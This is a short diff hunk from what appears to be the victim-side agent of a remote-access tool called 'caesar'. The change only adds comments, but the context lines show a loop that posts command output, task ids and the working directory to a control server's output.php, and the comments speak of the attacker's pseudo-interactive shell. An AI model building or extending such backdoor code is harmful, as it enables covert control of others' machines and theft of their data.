@@ -108,8 +108,12 @@ while 1:
 			r = requests.post ('http://' + caesar_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory)})
 
 	else:
+		# If the attacker is running a pseudo-interactive shell and he's not issuing commands
 		if (delay != 10):
+			# Increment the number of no-responses
 			no_response += 1
+			
+			# If there are too many no-responses from the server reset the delay (close the interactive-shell)
 			if no_response == 60:
 				delay = 10
 				no_response = 0
